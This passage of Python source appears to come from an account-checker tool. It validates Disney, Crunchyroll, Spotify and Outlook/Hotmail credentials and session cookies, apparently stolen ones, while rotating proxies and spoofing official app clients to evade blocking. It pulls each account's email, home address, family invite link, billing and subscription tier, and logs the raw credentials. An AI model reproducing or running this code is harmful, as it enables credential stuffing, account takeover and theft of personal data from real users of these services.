    timeout = 20

    # Step 1: Exchange refresh_token for access_token via /token endpoint
    try:
        tok = _disney_token_form(opener, {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "platform": "browser",
            "latitude": "0",
            "longitude": "0",
        }, timeout)

        if tok.get("_error") in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        acc_tok = tok.get("access_token")
        if not acc_tok:
            error_desc = tok.get("error_description", "") or tok.get("error", "") or str(tok.get("_error", ""))
            if tok.get("_error") == 401 or "invalid" in error_desc.lower() or "expired" in error_desc.lower():
                save_history("disney", "DEAD", route=proxy_label, raw_cookie=cookie_text)
                return {"status": "DEAD", "reason": f"Refresh token expired or invalid: {error_desc[:100]}", "route": proxy_label}
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=cookie_text)
            return {"status": "ERROR", "reason": f"Token exchange failed: {error_desc[:100]}", "route": proxy_label}
    except Exception as exc:
        save_history("disney", "ERROR", route=proxy_label, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Token request failed: {str(exc)[:100]}", "route": proxy_label}

    # Step 2: /accounts/me
    s_me, me = _disney_get_json(opener, DISNEY_ACCOUNTS_ME, acc_tok, timeout)
    if s_me != 200:
        me = {}

    # Step 3: /v2/subscribers
    s_subs, v2 = _disney_get_json(opener, DISNEY_SUBSCRIBERS, acc_tok, timeout)
    if s_subs != 200:
        v2 = {"subscriberStatus": "UNKNOWN", "subscriptions": []}

    # Step 4: /subscriptions
    subscriptions_raw = []
    s_rs, rs = _disney_get_json(opener, DISNEY_SUBSCRIPTIONS, acc_tok, timeout)
    if s_rs == 200 and isinstance(rs, list):
        subscriptions_raw = rs

    # Extract info
    attrs = me.get("attributes", {})
    disney_email = attrs.get("email", "")
    email_verified = str(attrs.get("emailVerified", False)).lower()
    country = _disney_get_country(me)
    country_name = normalize_country(country) if len(country) == 2 else country

    subscriber_status = v2.get("subscriberStatus", "UNKNOWN")
    v2_subs = v2.get("subscriptions", [])
    active = _disney_get_active_sub(v2_subs)

    if active:
        product = active.get("product", {})
        plan_name = product.get("name") or "Disney Plus"
        term = active.get("term", {})
        is_trial = term.get("isFreeTrial", False)
        has_plan = True
        status = "LIVE"
    else:
        plan_name = subscriber_status.title() if subscriber_status != "UNKNOWN" else "No Active Plan"
        is_trial = False
        has_plan = False
        status = "DEAD" if subscriber_status in ("UNKNOWN", "LAPSED", "CANCELLED") else "HOLD"

    renewal = _disney_get_renewal_date(subscriptions_raw)

    # Save to history
    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
    save_history("disney", status, plan=plan_name, billing=renewal,
                 country=country_name, route=route,
                 raw_cookie=cookie_text, email=disney_email)

    return {
        "status": status,
        "email": disney_email,
        "email_verified": email_verified,
        "country": country_name,
        "plan": plan_name,
        "free_trial": is_trial,
        "renewal_date": renewal,
        "subscriber_status": subscriber_status,
        "has_plan": has_plan,
        "route": route,
    }


# ══════════════════════════════════════════════════════════════════════════════
# Crunchyroll Account Checker (Android API reverse-engineered flow)
# ══════════════════════════════════════════════════════════════════════════════

CR_AUTH_BASIC = "Basic YWJvdGxoMXdlcTByNGxudm5haHo6dWlLSjJqUXRVX0FQYzdZa0hqSWlDTFoyMjhnbGxOY2o="
CR_AUTH_FALLBACK = "Basic dC1rZGdwMmg4YzNqdWI4Zm4wZnE6eWZMRGZNZnJZdktYaDRKWFMxTEVJMmNDcXUxdjVXYW4="

def check_crunchyroll_account(email, password, use_proxy=True):
    """Check a Crunchyroll account: login → profile → subscription."""
    import uuid as _uuid
    route = "Direct"
    proxies = None

    if use_proxy:
        proxy_result = get_random_proxy()
        if proxy_result and proxy_result[0]:
            proxies = proxy_result[0]   # {"http": ..., "https": ...}
            route = proxy_result[1]     # "ip:port (latency)"

    session = requests.Session()
    session.verify = True

    android_ver = str(random.randint(13, 15))
    okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
    ua = f"Crunchyroll/3.74.2 Android/{android_ver} okhttp/{okhttp_ver}"

    session.headers.update({
        "Authorization": CR_AUTH_BASIC,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": ua,
        "Connection": "Keep-Alive",
        "etp-anonymous-id": str(_uuid.uuid4()),
        "x-datadog-sampling-priority": "0",
    })

    if proxies:
        session.proxies = proxies

    # Step 1: Login
    try:
        login_data = {
            "username": email,
            "password": password,
            "grant_type": "password",
            "scope": "offline_access",
            "device_id": str(_uuid.uuid4()),
            "device_name": "sdk_gphone64_x86_64",
            "device_type": "Google sdk_gphone64_x86_64",
        }
        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)

        # Fallback to alternate auth token if client_inactive
        if r.status_code == 401 and "client_inactive" in r.text:
            session.headers["Authorization"] = CR_AUTH_FALLBACK
            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)

        if r.status_code == 401:
            save_history("crunchyroll", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}
        if r.status_code == 403:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "IP blocked by Crunchyroll (403)", "route": route}
        if r.status_code == 429:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}
        if r.status_code == 500:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Server error: {r.text[:100]}", "route": route}
        if r.status_code != 200:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Login failed ({r.status_code})", "route": route}

        jwt = r.json().get("access_token")
        if not jwt:
            save_history("crunchyroll", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "No access token returned", "route": route}

        session.headers["Authorization"] = f"Bearer {jwt}"
    except requests.exceptions.RequestException as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"Login request failed: {str(e)[:100]}", "route": route}

    # Step 2: Get account info (external_id, email, country)
    external_id = None
    username = ""
    cr_email = email
    email_verified = False
    country = ""
    created = ""
    avatar = ""
    preferred_lang = ""
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me", timeout=15)
        if r.status_code == 200:
            me = r.json()
            external_id = me.get("external_id")
            cr_email = me.get("email", email)
            email_verified = me.get("email_verified", False)
            created = me.get("created", "")
        else:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Failed to get account info ({r.status_code})", "route": route}
    except Exception as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"Account info failed: {str(e)[:100]}", "route": route}

    # Step 2b: Get profile (profile_name, avatar, country from maturity_rating)
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/profile", timeout=15)
        if r.status_code == 200:
            prof = r.json()
            username = prof.get("username", "") or prof.get("profile_name", "")
            avatar = prof.get("avatar", "")
            preferred_lang = prof.get("preferred_content_subtitle_language", "") or prof.get("preferred_content_audio_language", "")
            ext_ratings = prof.get("extended_maturity_rating", {})
            if ext_ratings:
                country = next(iter(ext_ratings.keys()), "")
    except Exception:
        pass

    # Step 3: Get multiprofile count
    num_profiles = 1
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/multiprofile", timeout=15)
        if r.status_code == 200:
            profiles = r.json().get("profiles", [])
            num_profiles = len(profiles)
    except Exception:
        pass

    # Step 4: Check subscription (benefits + products for full detail)
    subscription = "Free"
    sub_source = ""
    sub_country = ""
    sub_benefits = []
    concurrent_streams = 1
    has_ads = True
    offline_viewing = False
    sub_product_name = ""
    sub_cycle = ""
    sub_effective_date = ""
    is_cancelled = False
    active_free_trial = False
    try:
        if external_id:
            r = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", timeout=15)
            if r.status_code == 200:
                data = r.json()
                items = data.get("items", [])
                total_items = data.get("total", 0)
                sub_country = data.get("subscription_country", "")
                sub_benefits = [item.get("benefit", "") for item in items]
                if items:
                    sub_source = items[0].get("source", "")

                # Parse concurrent streams
                for b in sub_benefits:
                    if b.startswith("concurrent_streams."):
                        try: concurrent_streams = int(b.split(".")[-1])
                        except: pass
                has_ads = "no_ads" not in sub_benefits
                offline_viewing = "offline_viewing" in sub_benefits

                if total_items > 0:
                    if "cr_mega_pack" in sub_benefits:
                        subscription = "Mega Pack"
                    elif "cr_fan_pack" in sub_benefits:
                        subscription = "Fan Pack"
                    elif "cr_premium" in sub_benefits:
                        subscription = "Premium"
                    elif "catalog" in sub_benefits:
                        subscription = "Basic"
                    else:
                        subscription = "Unknown Premium"
                else:
                    subscription = "Free"
            elif r.status_code == 404:
                subscription = "Free"

            # Get product details (billing cycle, cancel status, trial)
            try:
                r2 = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", timeout=15)
                if r2.status_code == 200:
                    prod_data = r2.json()
                    prod_items = prod_data.get("items", [])
                    if prod_items:
                        prod = prod_items[0]
                        is_cancelled = prod.get("is_cancelled", False)
                        active_free_trial = prod.get("active_free_trial", False)
                        sub_effective_date = prod.get("effective_date", "")
                        product_info = prod.get("product", {})
                        sub_product_name = product_info.get("sku", "")
                        cycle_raw = product_info.get("cycle_duration", "")
                        # Parse ISO 8601 duration: P1M = Monthly, P1Y = Yearly, P7D = Weekly
                        if cycle_raw == "P1M": sub_cycle = "Monthly"
                        elif cycle_raw == "P3M": sub_cycle = "Quarterly"
                        elif cycle_raw == "P1Y" or cycle_raw == "P12M": sub_cycle = "Yearly"
                        elif cycle_raw == "P7D": sub_cycle = "Weekly"
                        else: sub_cycle = cycle_raw
            except Exception:
                pass
    except Exception:
        pass

    session.close()

    status = "LIVE" if subscription != "Free" else "FREE"

    result = {
        "status": status,
        "email": cr_email,
        "email_verified": email_verified,
        "username": username,
        "country": country.upper() if country else "",
        "subscription": subscription,
        "profiles": num_profiles,
        "external_id": external_id,
        "created": created,
        "route": route,
        # Subscription details
        "sub_country": sub_country,
        "sub_source": sub_source,
        "sub_cycle": sub_cycle,
        "concurrent_streams": concurrent_streams,
        "has_ads": has_ads,
        "offline_viewing": offline_viewing,
        "is_cancelled": is_cancelled,
        "active_free_trial": active_free_trial,
        "sub_effective_date": sub_effective_date,
        "avatar": avatar,
    }

    # Save to history
    plan_str = f"Crunchyroll {subscription}"
    save_history("crunchyroll", status, plan=plan_str, country=country.upper() if country else "",
                 route=route, raw_cookie=f"{email}:{password}", email=email)

    return result


# ══════════════════════════════════════════════════════════════════════════════
# Crunchyroll Cookie Checker (etp_rt cookie → session auth → profile → sub)
# ══════════════════════════════════════════════════════════════════════════════

def extract_crunchyroll_etp_rt(cookie_text):
    """Parse etp_rt from Netscape .txt, JSON array, etp_rt=XXX string, or raw token."""
    if not cookie_text:
        return None

    text = str(cookie_text).strip()

    # 1. JSON array format [{"name":"etp_rt","value":"xxx"}, ...]
    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            if isinstance(parsed, list):
                for c in parsed:
                    if isinstance(c, dict):
                        n = c.get("name", "")
                        v = c.get("value", "")
                        if n == "etp_rt" and v:
                            return v
        except Exception:
            pass

    # 2. Netscape format (tab-separated) — etp_rt is in column 6 (0-indexed: 5)
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] == "etp_rt":
            return parts[6]

    # 3. Raw string: etp_rt=XXXXXX or etp_rt=XXXXXX; other=YYY
    m = re.search(r'(?:^|[;\s])etp_rt=([^\s;,]+)', text)
    if m:
        return m.group(1)

    # 4. If text is just a raw token value (no = sign, long alphanum), treat as etp_rt value
    if len(text) > 50 and not any(c in text for c in ('=', '\t', '{', '[')):
        return text

    return None


def check_crunchyroll_cookie(cookie_text, use_proxy=True):
    """Check a Crunchyroll account using etp_rt cookie: token → profile → subscription."""
    import uuid as _uuid
    etp_rt = extract_crunchyroll_etp_rt(cookie_text)
    if not etp_rt:
        save_history("crunchyroll", "DEAD", raw_cookie=cookie_text)
        return {"status": "DEAD", "reason": "etp_rt cookie not found in input."}

    route = "Direct"
    proxies = None
    proxy_raw_url = None

    if use_proxy:
        proxy_result = get_random_proxy()
        if proxy_result and proxy_result[0]:
            proxies = proxy_result[0]
            route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
            proxy_raw_url = proxy_result[2]

    session = requests.Session()
    session.verify = True

    android_ver = str(random.randint(13, 15))
    okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
    ua = f"Crunchyroll/3.74.2 Android/{android_ver} okhttp/{okhttp_ver}"

    session.headers.update({
        "Authorization": CR_AUTH_FALLBACK,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": ua,
        "Connection": "Keep-Alive",
        "etp-anonymous-id": str(_uuid.uuid4()),
        "x-datadog-sampling-priority": "0",
    })

    if proxies:
        session.proxies = proxies

    # Step 1: Exchange etp_rt cookie for access_token
    try:
        session.cookies.set("etp_rt", etp_rt, domain=".crunchyroll.com")
        login_data = {
            "grant_type": "etp_rt_cookie",
            "scope": "offline_access",
        }
        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)

        # Fallback: use etp_rt as refresh_token in body
        if r.status_code in (400, 401):
            session.cookies.clear()
            login_data_fallback = {
                "grant_type": "refresh_token",
                "refresh_token": etp_rt,
                "scope": "offline_access",
            }
            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data_fallback, timeout=20)

        if r.status_code in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        if r.status_code == 401:
            save_history("crunchyroll", "DEAD", route=route, raw_cookie=cookie_text)
            return {"status": "DEAD", "reason": "Cookie expired or invalid (401)", "route": route}
        if r.status_code == 403:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
            return {"status": "ERROR", "reason": "IP blocked by Crunchyroll (403)", "route": route}
        if r.status_code == 429:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}
        if r.status_code != 200:
            save_history("crunchyroll", "DEAD", route=route, raw_cookie=cookie_text)
            return {"status": "DEAD", "reason": f"Token exchange failed ({r.status_code})", "route": route}

        jwt = r.json().get("access_token")
        if not jwt:
            save_history("crunchyroll", "DEAD", route=route, raw_cookie=cookie_text)
            return {"status": "DEAD", "reason": "No access token returned", "route": route}

        session.headers["Authorization"] = f"Bearer {jwt}"
    except requests.exceptions.RequestException as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Token request failed: {str(e)[:100]}", "route": route}

    # Step 2: Get account info (external_id, email, country)
    external_id = None
    username = ""
    cr_email = ""
    email_verified = False
    country = ""
    created = ""
    avatar = ""
    preferred_lang = ""
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me", timeout=15)
        if r.status_code == 200:
            me = r.json()
            external_id = me.get("external_id")
            cr_email = me.get("email", "")
            email_verified = me.get("email_verified", False)
            created = me.get("created", "")
        else:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
            return {"status": "ERROR", "reason": f"Failed to get account info ({r.status_code})", "route": route}
    except Exception as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Account info failed: {str(e)[:100]}", "route": route}

    # Step 2b: Get profile (profile_name, avatar, country from maturity_rating)
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/profile", timeout=15)
        if r.status_code == 200:
            prof = r.json()
            username = prof.get("username", "") or prof.get("profile_name", "")
            avatar = prof.get("avatar", "")
            preferred_lang = prof.get("preferred_content_subtitle_language", "") or prof.get("preferred_content_audio_language", "")
            ext_ratings = prof.get("extended_maturity_rating", {})
            if ext_ratings:
                country = next(iter(ext_ratings.keys()), "")
    except Exception:
        pass

    # Step 3: Get multiprofile count
    num_profiles = 1
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/multiprofile", timeout=15)
        if r.status_code == 200:
            profiles = r.json().get("profiles", [])
            num_profiles = len(profiles)
    except Exception:
        pass

    # Step 4: Check subscription (benefits + products for full detail)
    subscription = "Free"
    sub_source = ""
    sub_country = ""
    sub_benefits = []
    concurrent_streams = 1
    has_ads = True
    offline_viewing = False
    sub_product_name = ""
    sub_cycle = ""
    sub_effective_date = ""
    is_cancelled = False
    active_free_trial = False
    try:
        if external_id:
            r = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", timeout=15)
            if r.status_code == 200:
                data = r.json()
                items = data.get("items", [])
                total_items = data.get("total", 0)
                sub_country = data.get("subscription_country", "")
                sub_benefits = [item.get("benefit", "") for item in items]
                if items:
                    sub_source = items[0].get("source", "")

                # Parse concurrent streams
                for b in sub_benefits:
                    if b.startswith("concurrent_streams."):
                        try: concurrent_streams = int(b.split(".")[-1])
                        except: pass
                has_ads = "no_ads" not in sub_benefits
                offline_viewing = "offline_viewing" in sub_benefits

                if total_items > 0:
                    if "cr_mega_pack" in sub_benefits:
                        subscription = "Mega Pack"
                    elif "cr_fan_pack" in sub_benefits:
                        subscription = "Fan Pack"
                    elif "cr_premium" in sub_benefits:
                        subscription = "Premium"
                    elif "catalog" in sub_benefits:
                        subscription = "Basic"
                    else:
                        subscription = "Unknown Premium"
                else:
                    subscription = "Free"
            elif r.status_code == 404:
                subscription = "Free"

            # Get product details (billing cycle, cancel status, trial)
            try:
                r2 = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", timeout=15)
                if r2.status_code == 200:
                    prod_data = r2.json()
                    prod_items = prod_data.get("items", [])
                    if prod_items:
                        prod = prod_items[0]
                        is_cancelled = prod.get("is_cancelled", False)
                        active_free_trial = prod.get("active_free_trial", False)
                        sub_effective_date = prod.get("effective_date", "")
                        product_info = prod.get("product", {})
                        sub_product_name = product_info.get("sku", "")
                        cycle_raw = product_info.get("cycle_duration", "")
                        # Parse ISO 8601 duration: P1M = Monthly, P1Y = Yearly, P7D = Weekly
                        if cycle_raw == "P1M": sub_cycle = "Monthly"
                        elif cycle_raw == "P3M": sub_cycle = "Quarterly"
                        elif cycle_raw == "P1Y" or cycle_raw == "P12M": sub_cycle = "Yearly"
                        elif cycle_raw == "P7D": sub_cycle = "Weekly"
                        else: sub_cycle = cycle_raw
            except Exception:
                pass
    except Exception:
        pass

    session.close()

    status = "LIVE" if subscription != "Free" else "FREE"

    result = {
        "status": status,
        "email": cr_email,
        "email_verified": email_verified,
        "username": username,
        "country": country.upper() if country else "",
        "subscription": subscription,
        "profiles": num_profiles,
        "external_id": external_id,
        "created": created,
        "route": route,
        # Subscription details
        "sub_country": sub_country,
        "sub_source": sub_source,
        "sub_cycle": sub_cycle,
        "concurrent_streams": concurrent_streams,
        "has_ads": has_ads,
        "offline_viewing": offline_viewing,
        "is_cancelled": is_cancelled,
        "active_free_trial": active_free_trial,
        "sub_effective_date": sub_effective_date,
        "avatar": avatar,
    }

    # Save to history
    plan_str = f"Crunchyroll {subscription}"
    save_history("crunchyroll", status, plan=plan_str, country=country.upper() if country else "",
                 route=route, raw_cookie=cookie_text, email=cr_email)

    return result


# ══════════════════════════════════════════════════════════════════════════════
# Spotify Cookie Checker (sp_dc cookie → account overview + profile + family)
# ══════════════════════════════════════════════════════════════════════════════

SPOTIFY_PLAN_MAP = {
    'duo_premium': 'Duo Premium',
    'family_premium_v2': 'Family Premium',
    'family_basic': 'Family Basic',
    'premium': 'Premium',
    'premium_mini': 'Premium Mini',
    'basic_premium': 'Premium Basic',
    'student_premium': 'Student Premium',
    'student_premium_hulu': 'Student Premium (Hulu)',
    'free': 'Free',
}

SPOTIFY_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
}


def extract_spotify_sp_dc(cookie_text):
    """Parse sp_dc from Netscape .txt, JSON array, or raw sp_dc=XXX string."""
    if not cookie_text:
        return None

    text = str(cookie_text).strip()

    # 1. JSON array format [{"name":"sp_dc","value":"xxx"}, ...]
    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            if isinstance(parsed, list):
                for c in parsed:
                    if isinstance(c, dict):
                        n = c.get("name", "")
                        v = c.get("value", "")
                        if n == "sp_dc" and v:
                            return v
        except Exception:
            pass

    # 2. Netscape format (tab-separated)
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] == "sp_dc":
            return parts[6]

    # 3. Raw string: sp_dc=XXXXXX or sp_dc=XXXXXX; sp_key=YYYYYY
    m = re.search(r'(?:^|[;\s])sp_dc=([^\s;,]+)', text)
    if m:
        return m.group(1)

    # 4. If text is just a raw token value (no = sign, long alphanum), treat as sp_dc value
    if len(text) > 50 and not any(c in text for c in ('=', '\t', '{', '[')):
        return text

    return None


def check_spotify_cookie(cookie_text, use_proxy=True):
    """Check a Spotify account using sp_dc cookie."""
    sp_dc = extract_spotify_sp_dc(cookie_text)
    if not sp_dc:
        save_history("spotify", "DEAD", raw_cookie=cookie_text)
        return {"status": "DEAD", "reason": "sp_dc cookie not found in input."}

    route = "Direct"
    proxies = None
    proxy_raw_url = None

    if use_proxy:
        proxy_result = get_random_proxy()
        if proxy_result and proxy_result[0]:
            proxies = proxy_result[0]
            route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
            proxy_raw_url = proxy_result[2]

    session = requests.Session()
    session.verify = True
    session.headers.update(SPOTIFY_HEADERS)
    session.cookies.set("sp_dc", sp_dc, domain=".spotify.com")

    if proxies:
        session.proxies = proxies

    result = {
        "status": "DEAD",
        "plan": "",
        "email": "",
        "country": "",
        "is_owner": None,
        "free_slots": None,
        "invite_link": "",
        "address": "",
        "is_child_account": False,
        "next_payment_date": "",
        "route": route,
    }

    try:
        # Step 1: Account overview page
        r = session.get("https://www.spotify.com/us/account/overview/", timeout=15, allow_redirects=True)

        if r.status_code in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        if "login" in r.url.lower() or r.status_code in (401, 403):
            session.close()
            save_history("spotify", "DEAD", route=route, raw_cookie=cookie_text)
            return {"status": "DEAD", "reason": "Cookie expired / redirected to login.", "route": route}

        html = r.text

        # Parse plan from overview page reactContext / JSON state
        plan_raw = ""
        plan_match = re.search(r'"currentPlan"\s*:\s*"([^"]+)"', html)
        if not plan_match:
            plan_match = re.search(r'"plan"\s*:\s*"([^"]+)"', html)
        if not plan_match:
            plan_match = re.search(r'"productName"\s*:\s*"([^"]+)"', html)
        if plan_match:
            plan_raw = plan_match.group(1).strip()

        plan_name = SPOTIFY_PLAN_MAP.get(plan_raw.lower(), plan_raw.replace('_', ' ').title() if plan_raw else '')

        # loggedIn check
        logged_in = bool(re.search(r'"isLoggedIn"\s*:\s*true', html, re.I))
        if not logged_in:
            logged_in = bool(re.search(r'"loggedIn"\s*:\s*true', html, re.I))

        # country
        country_match = re.search(r'"country"\s*:\s*"([A-Za-z]{2})"', html)
        country = normalize_country(country_match.group(1)) if country_match else ""

        # isRecurring
        is_recurring_match = re.search(r'"isRecurring"\s*:\s*(true|false)', html, re.I)
        is_recurring = is_recurring_match.group(1).lower() == 'true' if is_recurring_match else None

        # isMaster / isSubAccount
        is_master_match = re.search(r'"isMaster"\s*:\s*(true|false)', html, re.I)
        is_master = is_master_match.group(1).lower() == 'true' if is_master_match else None

        is_sub_match = re.search(r'"isSubAccount"\s*:\s*(true|false)', html, re.I)
        is_sub_account = is_sub_match.group(1).lower() == 'true' if is_sub_match else False

        # freeSlots
        free_slots_match = re.search(r'"freeSlots"\s*:\s*(\d+)', html)
        free_slots = int(free_slots_match.group(1)) if free_slots_match else None

        # inviteLink
        invite_match = re.search(r'"inviteLink"\s*:\s*"([^"]+)"', html)
        invite_link = invite_match.group(1) if invite_match else ""

        # address
        address_match = re.search(r'"address"\s*:\s*"([^"]+)"', html)
        address = address_match.group(1) if address_match else ""

        # nextPaymentDate
        payment_match = re.search(r'"nextPaymentDate"\s*:\s*"([^"]+)"', html)
        if not payment_match:
            payment_match = re.search(r'"nextBillingInfo"\s*:\s*"([^"]+)"', html)
        next_payment = payment_match.group(1) if payment_match else ""

        # Step 2: Profile API for email & country
        try:
            r2 = session.get("https://www.spotify.com/api/account-settings/v1/profile", timeout=12)
            if r2.status_code == 200:
                prof = r2.json()
                result["email"] = prof.get("email", "") or prof.get("username", "")
                if not country and prof.get("country"):
                    country = normalize_country(prof["country"])
        except Exception:
            pass

        # Step 3: Family API for family details
        family_members = []
        family_max = None
        try:
            r3 = session.get("https://www.spotify.com/api/family/v1/family/home", timeout=12)
            if r3.status_code == 200:
                fam = r3.json()
                family_members = fam.get("members", [])
                family_max = fam.get("maxCapacity")
                if fam.get("inviteToken") and not invite_link:
                    invite_link = f"https://www.spotify.com/family/join/invite/{fam['inviteToken']}"
                if fam.get("address") and not address:
                    addr_obj = fam["address"]
                    if isinstance(addr_obj, dict):
                        parts = [addr_obj.get("street", ""), addr_obj.get("city", ""),
                                 addr_obj.get("state", ""), addr_obj.get("postalCode", ""),
                                 addr_obj.get("country", "")]
                        address = ", ".join(p for p in parts if p)
                    elif isinstance(addr_obj, str):
                        address = addr_obj
                if is_master is None and family_members:
                    # determine if current user is owner
                    for mem in family_members:
                        if mem.get("isOwner") and mem.get("email") == result.get("email"):
                            is_master = True
                            break
                if free_slots is None and family_max is not None:
                    free_slots = max(0, family_max - len(family_members))
        except Exception:
            pass

        session.close()

        # Determine status
        if not logged_in and not plan_raw and not result["email"]:
            status = "DEAD"
        elif plan_raw.lower() == 'free' or not plan_raw:
            status = "FREE"
            if not plan_name:
                plan_name = "Free"
        else:
            status = "LIVE"

        result.update({
            "status": status,
            "plan": plan_name,
            "country": country,
            "is_owner": is_master,
            "is_child_account": is_sub_account,
            "free_slots": free_slots,
            "invite_link": invite_link,
            "address": address,
            "next_payment_date": next_payment,
            "is_recurring": is_recurring,
            "family_members": len(family_members) if family_members else 0,
            "family_max_capacity": family_max,
        })

        # Save to history
        billing = ""
        if next_payment:
            billing = f"Next: {next_payment}"
            if is_recurring:
                billing += " [Auto-renew]"
        elif is_recurring is False:
            billing = "Not recurring"

        save_history("spotify", status, plan=f"Spotify {plan_name}" if plan_name else "",
                     billing=billing, country=country, route=route,
                     raw_cookie=cookie_text, email=result.get("email", ""))

        return result

    except (requests.exceptions.ProxyError, requests.exceptions.Timeout) as e:
        session.close()
        if proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)
        if use_proxy:
            # Automatic fallback to direct
            return check_spotify_cookie(cookie_text, use_proxy=False)
        save_history("spotify", "ERROR", route=route, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Request failed: {str(e)[:150]}", "route": route}
    except Exception as e:
        session.close()
        save_history("spotify", "ERROR", route=route, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Request failed: {str(e)[:150]}", "route": route}


# ══════════════════════════════════════════════════════════════════════════════
# Outlook / Hotmail Account Checker (Microsoft OAuth login flow)
# ══════════════════════════════════════════════════════════════════════════════

OUTLOOK_AUTH_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
OUTLOOK_CLIENT_ID = "e6f8716e-299d-4ed9-bbf3-453f192f44e5"
OUTLOOK_REDIRECT_URI = "msauth://net.thunderbird.android/S9nqeF27sTJcEfaInpC%2BDHzHuCY%3D"
OUTLOOK_SCOPE = "https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access"

OUTLOOK_AUTH_PARAMS = {
    "redirect_uri": OUTLOOK_REDIRECT_URI,
    "client_id": OUTLOOK_CLIENT_ID,
    "response_type": "code",
    "state": "v4WtWWgYCOSHR7rZivYT2A",
    "nonce": "MIgPdBlxPYQSDCh9SK1ocg",
    "scope": OUTLOOK_SCOPE,
    "code_challenge": "ybj7gD4AewA9XLNLnunRS0LlY3wIf_iJuP8YfJE2LNA",
    "code_challenge_method": "S256",
}

OUTLOOK_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}


def check_outlook_account(email, password, use_proxy=True):
    """Check a Hotmail/Outlook account via Microsoft OAuth login flow."""
    # Detect service type based on email domain
    email_lower = email.lower().strip()
    if "@hotmail." in email_lower or "@live." in email_lower:
        svc_type = "hotmail"
        svc_label = "Hotmail"
    else:
        svc_type = "outlook"
        svc_label = "Outlook"

    route = "Direct"
    proxies = None
    proxy_raw_url = None

    if use_proxy:
        proxy_result = get_random_proxy()
        if proxy_result and proxy_result[0]:
            proxies = proxy_result[0]
            route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
